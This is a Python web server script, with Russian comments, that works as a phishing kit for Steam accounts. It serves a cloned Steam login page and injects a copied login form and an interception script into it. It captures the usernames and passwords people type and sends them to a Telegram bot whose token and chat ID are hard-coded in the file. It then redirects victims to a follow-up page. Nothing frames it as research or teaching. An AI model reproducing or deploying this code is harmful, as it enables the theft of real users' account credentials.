# server.py
import os
import http.server
import socketserver
import urllib.parse
import urllib.request
import webbrowser
from pathlib import Path

PORT = int(os.environ.get("PORT", 8000))
server_address = ("0.0.0.0", PORT)

BASE_DIR = Path(__file__).resolve().parent
TARGET_DIR = BASE_DIR / "popa" if (BASE_DIR / "popa").exists() else BASE_DIR

NEXT_PAGE_FILENAME = "next.html"

# НАСТРОЙКИ TELEGRAM БОТА
TELEGRAM_BOT_TOKEN = "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs"
TELEGRAM_CHAT_ID = "8869604033"


def send_to_telegram(message: str):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "ТВОЙ_ТОКЕН_БОТА":
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }).encode("utf-8")
        req = urllib.request.Request(url, data=data, method="POST")
        with urllib.request.urlopen(req, timeout=5) as response:
            pass
    except Exception as e:
        print(f"[-] Ошибка отправки в Telegram: {e}")


STEAM_LOGIN_DOM = """
<style>
.steam_react_login_wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 80px 0 150px 0;
    font-family: "Motiva Sans", Sans-serif;
    color: #fff;
}
.steam_react_login_inner {
    width: 700px;
    max-width: 100%;
}
.steam_react_login_title {
    font-size: 28px;
    font-weight: 800;
    color: #ffffff;
    margin-bottom: 32px;
    letter-spacing: 0.5px;
}
.steam_react_login_box {
    background-color: #181a21;
    border-radius: 4px;
    padding: 24px 32px;
    display: flex;
    flex-direction: row;
    gap: 40px;
    box-sizing: border-box;
}
.steam_react_form_col {
    flex: 1;
    display: flex;
    flex-direction: column;
}
.steam_react_label_blue {
    font-size: 12px;
    color: #1999ff;
    text-transform: uppercase;
    font-weight: 500;
    margin-bottom: 4px;
    letter-spacing: 0.02em;
}
.steam_react_label_gray {
    font-size: 12px;
    color: #afafaf;
    text-transform: uppercase;
    font-weight: 500;
    margin-bottom: 4px;
    margin-top: 18px;
    letter-spacing: 0.02em;
}
.steam_react_input {
    border-radius: 2px;
    color: #fff;
    padding: 10px;
    background-color: #32353c;
    outline: none;
    font-size: 15px;
    border: 1px solid #32353c;
    width: 100%;
    box-sizing: border-box;
    transition: border 0.2s ease;
}
.steam_react_input:hover, .steam_react_input:focus {
    background-color: #393c44;
}
.steam_react_remember {
    display: flex;
    align-items: center;
    margin-top: 14px;
    cursor: pointer;
    user-select: none;
}
.steam_react_checkbox {
    width: 18px;
    height: 18px;
    background-color: #32353c;
    border-radius: 2px;
    margin-right: 8px;
    accent-color: #32353c;
    cursor: pointer;
}
.steam_react_remember span {
    font-size: 12px;
    color: #afafaf;
}
.steam_react_btn_wrap {
    display: flex;
    justify-content: center;
    margin-top: 24px;
}
.steam_react_submit {
    width: 270px;
    padding: 12px;
    border-radius: 2px;
    border: none;
    background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
    color: #fff;
    font-size: 16px;
    font-weight: 400;
    cursor: pointer;
    font-family: "Motiva Sans", Sans-serif;
}
.steam_react_submit:hover {
    background: linear-gradient(90deg, #06BFFF 30%, #2D73FF 100%);
}
.steam_react_help_link {
    text-align: center;
    margin-top: 28px;
}
.steam_react_help_link a {
    color: #afafaf;
    font-size: 12px;
    text-decoration: underline;
}
.steam_react_help_link a:hover {
    color: #fff;
}
.steam_react_qr_col {
    width: 200px;
    display: flex;
    flex-direction: column;
}
.steam_react_qr_box {
    background: #ffffff;
    border-radius: 8px;
    padding: 12px;
    width: 200px;
    height: 200px;
    box-sizing: border-box;
    display: flex;
    align-items: center;
    justify-content: center;
}
.steam_react_qr_box img {
    width: 100%;
    height: 100%;
    display: block;
}
.steam_react_qr_sub {
    font-size: 12px;
    color: #afafaf;
    text-align: center;
    margin-top: 10px;
    line-height: 16px;
}
.steam_react_qr_sub a {
    color: #afafaf;
    text-decoration: underline;
}
</style>

<div class="steam_react_login_wrap">
    <div class="steam_react_login_inner">
        <div class="steam_react_login_title">Вход</div>
        <div class="steam_react_login_box">
            <form class="steam_react_form_col" action="/next" method="POST" id="steam_login_form">
                <div class="steam_react_label_blue">Войдите, используя имя аккаунта</div>
                <input type="text" id="steam_user_input" name="username" class="steam_react_input" value="" autofocus>

                <div class="steam_react_label_gray">Пароль</div>
                <input type="password" id="steam_pass_input" name="password" class="steam_react_input" value="">

                <label class="steam_react_remember">
                    <input type="checkbox" name="remember" class="steam_react_checkbox" checked>
                    <span>Запомнить меня</span>
                </label>

                <div class="steam_react_btn_wrap">
                    <button type="submit" class="steam_react_submit" id="steam_submit_btn">Войти</button>
                </div>

                <div class="steam_react_help_link">
                    <a href="https://help.steampowered.com/ru/wizard/HelpWithLogin">Помогите, я не могу войти в аккаунт</a>
                </div>
            </form>

            <div class="steam_react_qr_col">
                <div class="steam_react_label_blue">Или QR-код</div>
                <div class="steam_react_qr_box">
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=https://store.steampowered.com/login" alt="QR">
                </div>
                <div class="steam_react_qr_sub">
                    Используйте <a href="https://store.steampowered.com/mobile">мобильное приложение Steam</a>, чтобы войти с помощью QR-кода
                </div>
            </div>
        </div>
    </div>
</div>
"""

FORCE_REDIRECT_SCRIPT = """
<script>
// Абсолютно надежный перехват на уровне формы и кнопки с учетом HTTPS на хостинге
document.addEventListener("click", function(e) {
    var btn = e.target.closest("button, input[type='submit'], .steam_react_submit");
    if (btn) {
        var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
        var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");

        var uVal = userInput ? userInput.value.trim() : "";
        var pVal = passInput ? passInput.value.trim() : "";

        if (uVal || pVal) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            // Используем относительный путь для корректной работы под HTTPS на хостинге
            window.location.href = window.location.origin + "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
        }
    }
}, true);

document.addEventListener("submit", function(e) {
    var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
    var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");

    var uVal = userInput ? userInput.value.trim() : "";
    var pVal = passInput ? passInput.value.trim() : "";

    if (uVal || pVal) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        window.location.href = window.location.origin + "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
    }
}, true);
</script>
"""


def resolve_next_page() -> Path | None:
    candidates = [
        TARGET_DIR / NEXT_PAGE_FILENAME,
        BASE_DIR / NEXT_PAGE_FILENAME,
        TARGET_DIR / "Войти (13.11.2026 22：15：12).html",
        BASE_DIR / "Войти (13.11.2026 22：15：12).html",
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    return None


class CustomStaticHandler(http.server.SimpleHTTPRequestHandler):
    extensions_map = {
        **http.server.SimpleHTTPRequestHandler.extensions_map,
        '.css': 'text/css; charset=utf-8',
        '.js': 'application/javascript; charset=utf-8',
        '.html': 'text/html; charset=utf-8',
        '.svg': 'image/svg+xml',
        '.ttf': 'font/ttf',
        '.woff': 'font/woff',
        '.woff2': 'font/woff2',
    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(TARGET_DIR), **kwargs)

    def _serve_next_page(self, username: str, password: str):
        next_file = resolve_next_page()
        if next_file and next_file.exists():
            print(f"[*] Открыта следующая страница для аккаунта: {username}")
            content = next_file.read_text(encoding="utf-8", errors="ignore")

            if username:
                content = content.replace("egorik_big_balls", username)

            encoded = content.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(encoded)))
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
            self.end_headers()
            self.wfile.write(encoded)
        else:
            msg = f"<h2>Файл {NEXT_PAGE_FILENAME} не найден в {TARGET_DIR}</h2>".encode("utf-8")
            self.send_response(404)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(msg)))
            self.end_headers()
            self.wfile.write(msg)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = urllib.parse.parse_qs(body)
        username = params.get("username", [""])[0].strip()
        password = params.get("password", [""])[0].strip()

        if username:
            msg = (
                "🟢 <b>Новая попытка входа!</b>\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Аккаунт:</b> <code>{username}</code>\n"
                f"🔑 <b>Пароль:</b> <code>{password}</code>\n"
                "━━━━━━━━━━━━━━━━━━━"
            )
            send_to_telegram(msg)

        clean_path = urllib.parse.unquote(self.path.split('?')[0])
        if clean_path in ("/next", "/next.html"):
            redirect_url = f"/next?user={urllib.parse.quote(username)}&pass={urllib.parse.quote(password)}" if username else "/next"
            self.send_response(303)
            self.send_header("Location", redirect_url)
            self.end_headers()
            return
        self.send_error(405, "Method Not Allowed")

    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        clean_path = urllib.parse.unquote(parsed_url.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        if clean_path in ("/next", "/next.html"):
            username = query_params.get("user", [""])[0].strip()
            password = query_params.get("pass", [""])[0].strip()
            if username:
                msg = (
                    "🟢 <b>Успешный вход / Переход!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>Аккаунт:</b> <code>{username}</code>\n"
                    f"🔑 <b>Пароль:</b> <code>{password}</code>\n"
                    "━━━━━━━━━━━━━━━━━━━"
                )
                send_to_telegram(msg)
            self._serve_next_page(username, password)
            return

        if clean_path.endswith(".html") and "login" in clean_path:
            file_path = TARGET_DIR / clean_path.lstrip("/")
            if file_path.exists():
                content = file_path.read_text(encoding="utf-8", errors="ignore")

                if "steam_react_login_wrap" not in content:
                    markers = [
                        'data-featuretarget="login">',
                        'class="login_ctn">',
                        '<div class="page_content">'
                    ]
                    injected = False
                    for marker in markers:
                        if marker in content:
                            content = content.replace(marker, marker + STEAM_LOGIN_DOM, 1)
                            injected = True
                            break
                    if not injected and "</body>" in content:
                        content = content.replace("</body>", STEAM_LOGIN_DOM + "</body>", 1)
                else:
                    content = content.replace('onsubmit="return false;"', 'action="/next" method="POST"')

                if "</body>" in content:
                    content = content.replace("</body>", FORCE_REDIRECT_SCRIPT + "</body>", 1)
                else:
                    content += FORCE_REDIRECT_SCRIPT

                encoded = content.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(encoded)))
                self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
                self.end_headers()
                self.wfile.write(encoded)
                return

        super().do_GET()


def find_entry_point(root_path: Path) -> str:
    candidates = [
        root_path / "store.steampowered.com" / "login" / "index3dbf.html",
        root_path / "index3dbf.html",
    ]
    for candidate in candidates:
        if candidate.exists():
            return f"/{candidate.relative_to(root_path).as_posix()}"
    return "/"


def run_server():
    socketserver.TCPServer.allow_reuse_address = True
    entry_route = find_entry_point(TARGET_DIR)
    url = f"http://localhost:{PORT}{entry_route}"

    with socketserver.TCPServer(("0.0.0.0", PORT), CustomStaticHandler) as httpd:
        print(f"[*] Сервер запущен: {url}")
        webbrowser.open(url)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()


if __name__ == "__main__":
    run_server()
